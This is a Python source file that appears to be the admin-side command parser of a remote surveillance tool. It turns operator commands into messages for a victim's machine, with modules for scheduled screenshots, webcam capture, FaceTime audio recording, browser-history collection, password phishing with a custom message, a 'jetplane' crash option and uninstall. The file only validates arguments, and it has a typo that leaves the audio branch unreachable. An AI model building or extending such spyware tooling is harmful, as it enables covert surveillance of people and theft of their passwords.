import re
import argparse
"""
Commands entered by the admin are processed here.
Error checking and converting what was entered into a message to send to the client's
machine are done here. 

"""
def is_time_valid(hour, minute):
    if hour < 0 or hour > 23:
        print("hour must be between 0 and 23")
        return False
    if minute < 0 or minute > 59:
        print("minute must be between 0 and 59")
        return False
    return True

def is_time_greater(start, end):
    if start["hour"] > end["hour"] or (start["hour"] == end["hour"] and start["minute"] > end["minute"]):
        print("start time is greater than end time")
        return True
    return False


parser = argparse.ArgumentParser(usage="")

parser.add_argument('module', choices=['screenshot', 'webcam', 'facetimeaudio', 'browserhistory', 'usageintervals', 'uninstall', 'phishpassword', 'jetplane'])

parser.add_argument("--interval", nargs=3, metavar=('weekday', 'MM:SS', 'MM:SS'))
parser.add_argument("--frequency", nargs=1, metavar='HH:MM:SS')

parser.add_argument('--time', nargs=2, metavar=('weekday','HH:MM'))

parser.add_argument('--app', nargs=1, metavar=('AppName'))
parser.add_argument('--message', nargs='+', metavar=('phishingMessage'))

jetplaneArgs = parser.add_mutually_exclusive_group()
jetplaneArgs.add_argument('--crash', action='store_true')
jetplaneArgs.add_argument('--altitude', nargs=1, metavar=('degrees_C)'))

weekdays = ['mon', 'tues', 'wed', 'thurs', 'fri', 'sat', 'sun']
timeFormat = "^[0-9]{2}:[0-9]{2}$"
freqencyFormat = "^[0-9]{2}:[0-9]{2}:[0-9]{2}$"

def create_message(args):
    options = {}
    try:
        args = parser.parse_args(args.split())
    except SystemExit:
        return None

    if args.module == 'screenshot':
        options["module"] = "screenshot"
        if args.interval:
            if args.interval[0] not in weekdays:
                print(f"weekday must be one of {weekdays}")
                return None
            if not re.match(timeFormat, args.interval[1]) or not re.match(timeFormat, args.interval[2]):
                print("intervals must be in the format MM:SS")
                return None
            if not args.frequency:
                print("frequency must be specified") 
                return None
            if not re.match(freqencyFormat, args.frequency[0]):
                print("frequency must be in the format HH:MM:SS")
                return None
            
            options["module"] = "screenshot"
            options["weekday"] = weekdays.index(args.interval[0])
            options["startTime"] = {}
            options["startTime"]["hour"] = int(args.interval[1].split(':')[0])
            options["startTime"]["minute"] = int(args.interval[1].split(':')[1])
            options["endTime"] = {}
            options["endTime"]["hour"] = int(args.interval[2].split(':')[0])
            options["endTime"]["minute"] = int(args.interval[2].split(':')[1])
            options["frequency"] = {}
            options["frequency"]["hours"] = int(args.frequency[0].split(':')[0])
            options["frequency"]["minutes"] = int(args.frequency[0].split(':')[1])
            options["frequency"]["seconds"] = int(args.frequency[0].split(':')[2])

            if options["frequency"]["hours"] == 0 and options["frequency"]["minutes"] == 0 and options["frequency"]["seconds"] == 0:
                print("frequency cannot not be 00:00:00")
                return None
            
            if not is_time_valid(options["startTime"]["hour"], options["startTime"]["minute"]):
                return None
            if not is_time_valid(options["endTime"]["hour"], options["endTime"]["minute"]):
                return None
            if is_time_greater(options["startTime"], options["endTime"]):
                return None
            if options["frequency"]["seconds"] not in [0,1,2,3,4,5,6,10,12,15,20,30]:
                print("frequency seconds must be one of [0,1,2,3,4,5,6,10,12,15,20,30]")
                return None

        elif args.frequency:
            print("--interval must be specified for frequency")
            return None
        
        return options

    elif args.module == 'webcam':
        options["module"] = "webcam"
        if args.time:
            if args.time[0] not in weekdays:
                print(f"weekday must be one of {weekdays}")
                return None
            if not re.match(timeFormat, args.time[1]):
                print("time must be in the format HH:MM")
                return None

            options["weekday"] = weekdays.index(args.time[0])
            options["time"] = {}
            options["time"]["hour"] = int(args.time[1].split(':')[0])
            options["time"]["minute"] = int(args.time[1].split(':')[1])
            
        return options

    elif args.module == 'facetimeauio':
        options["module"] = "facetimeaudio"
        if args.interval:
            if args.interval[0] not in weekdays:
                print(f"weekday must be one of {weekdays}")
                return None
            if not re.match(timeFormat, args.interval[1]) or not re.match(timeFormat, args.interval[2]):
                print("intervals must be in the format MM:SS")
                return None

            options["weekday"] = weekdays.index(args.interval[0])
            options["startTime"] = {}
            options["startTime"]["hour"] = int(args.interval[1].split(':')[0])
            options["startTime"]["minute"] = int(args.interval[1].split(':')[1])
            options["endTime"] = {}
            options["endTime"]["hour"] = int(args.interval[2].split(':')[0])
            options["endTime"]["minute"] = int(args.interval[2].split(':')[1])

            if not is_time_valid(options["startTime"]["hour"], options["startTime"]["minute"]):
                return None
            if not is_time_valid(options["endTime"]["hour"], options["endTime"]["minute"]):
                return None
            if is_time_greater(options["startTime"], options["endTime"]):
                return None
        return options

    elif args.module == 'usageintervals':
        options["module"] = "usage_intervals"
        return options
    
    elif args.module == 'browserhistory':
        options["module"] = 'browser_history'
        return options

    elif args.module == 'phishpassword':
        options["module"] = 'phish_password'
        if args.app:
            options['appName'] = args.app[0]
        if args.message:
            options['message'] = ' '.join(args.message)
        return options
    
    elif args.module == 'jetplane':
        options["module"] = 'jetplane'
        if args.altitude:
            options['maxTemp'] = int(args.altitude[0])
        elif args.crash:
            options['crash'] = True

        return options

    elif args.module == 'uninstall':
        options["module"] = 'uninstall'
        return options
    
    else:
        pass